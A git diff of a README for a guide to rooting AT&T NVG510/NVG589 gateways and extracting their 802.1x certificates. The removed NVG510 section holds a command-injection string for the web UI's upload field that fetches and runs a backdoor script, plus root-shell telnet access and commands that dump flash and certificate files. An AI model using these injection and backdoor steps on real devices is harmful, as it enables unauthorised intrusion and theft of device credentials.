@@ -16,40 +16,13 @@ This method works to rip the 802.1x keys from NVG589.
 ## Prerequisites
 - [Python 3](https://www.python.org/downloads/release/python-373/) for the local http server. There are many alternatives(e.g. [mobaxterm](https://mobaxterm.mobatek.net/)).
 - Basic knowledge of POSIX commands (cd, mkdir, wget, etc.).
-- A NVG510 or NVG589
+- A NVG589
 
 [Back to menu](#menu)
 ## Extract Certificates
-The certificates extracted from both NVG510 and NVG589 work, however NVG510 costs less and is easier to root.
-- [NVG510](#nvg510)
+The certificates extracted from both NVG589 and NVG599 work. 
 - [NVG589](#nvg589) (maybe NVG599)
-### NVG510
-#### Rooting
-Credit: [earlz](http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui)
-- Downgrade firmware to [9.0.6h2d30](firmware/nvg510/nbxv9.0.6h2d30.bin)
-- Follow this guide [Rooting The NVG510 from the WebUI](http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui).  
-If NVG510 has no connection to internet, you may want to setup a local server for NVG510 to download the script.
-  - Download [http://earlz.net/static/backdoor.nvg510.sh](http://earlz.net/static/backdoor.nvg510.sh)
-  - Using Python to setup a simple http server. `python -m http.server`
-  - Change _uploadfile_ to `errrr && wget http://YOUR_LOCAL_IP:8000/backdoor.nvg510.sh -O /tmp/backdoor.sh && source /tmp/backdoor.sh && errr`
-<!-- - If it is successful, you should see something like this: -->
-- Login `telnet 192.168.1.254 28`. The username is **admin** and the password is your modem's *access code*.
-- Type `!`. It switches to root shell.
 
-#### Extract Certificates
-- Download [busybox-mips](https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-mips) to your **local** device. 
-- Start Python http server. `python -m http.server`
-- In NVG510, `wget https://YOUR_LOCAL_IP:8000/busybox-mips -O /tmp/busybox`
-- `chmod +x /tmp/busybox`
-- `/tmp/busybox dd if=/dev/mtdblock4 of=/tmp/mfg.dat bs=1k`
-- `mkdir /tmp/images` 
-- `mount -o blind /tmp/images /www/att/imges`
-- `cp /tmp/mfg.dat /www/att/images`
-- `cd /tmp`
-- `tar cf cert.tar /etc/rootcert/`
-- `cp cert.tar /www/att/images`
--  Download http://192.168.1.254/images/mfg.dat and http://192.168.1.254/images/cert.tar to your **local** device.
-   
 ### NVG589 
 #### Rooting
 Credit: [nomotion](https://www.nomotion.net/blog/sharknatto/)
